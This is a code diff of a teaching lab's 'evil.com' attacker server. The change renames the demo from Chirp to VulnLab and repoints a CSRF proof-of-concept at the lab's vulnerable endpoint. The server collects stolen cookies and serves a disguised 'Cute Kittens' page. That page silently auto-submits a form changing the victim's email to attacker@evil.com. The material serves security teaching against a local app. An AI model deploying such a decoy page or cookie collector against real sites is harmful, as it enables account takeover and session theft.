@@ -1,5 +1,5 @@
 """
-evil.com — the attacker's collection server for the Chirp demo.
+evil.com — the attacker's collection server for VulnLab.
 
 Runs on port 6001, separate from the victim app (127.0.0.1:5050). It exists
 so cookie theft is shown END TO END (stolen cookies land here), instead of
@@ -7,7 +7,7 @@ just printing document.cookie in the victim's own console.
 
     python evil_server.py
 
-⚠️  For authorized classroom use against the local Chirp app ONLY.
+⚠️  For authorized classroom use against the local VulnLab app ONLY.
 """
 import datetime
 import os
@@ -33,13 +33,14 @@ def steal():
 
 @app.route("/csrf_poc.html")
 def csrf_poc():
-    """A booby-trapped page. Just visiting it (while logged into Chirp)
-    silently changes the victim's email to the attacker's — classic CSRF."""
+    """A booby-trapped page. Just visiting it silently changes the victim's
+    email to the attacker's — classic CSRF (works against VulnLab's /csrf
+    section in vulnerable mode)."""
     return """<!DOCTYPE html>
 <html><body>
   <h1>😻 Cute Kittens</h1>
   <p>Enjoy these free kittens while this totally normal page loads...</p>
-  <form id="f" action="%s/change_email" method="POST">
+  <form id="f" action="%s/csrf/change?mode=vuln" method="POST">
     <input type="hidden" name="new_email" value="attacker@evil.com">
   </form>
   <script>document.getElementById('f').submit();</script>
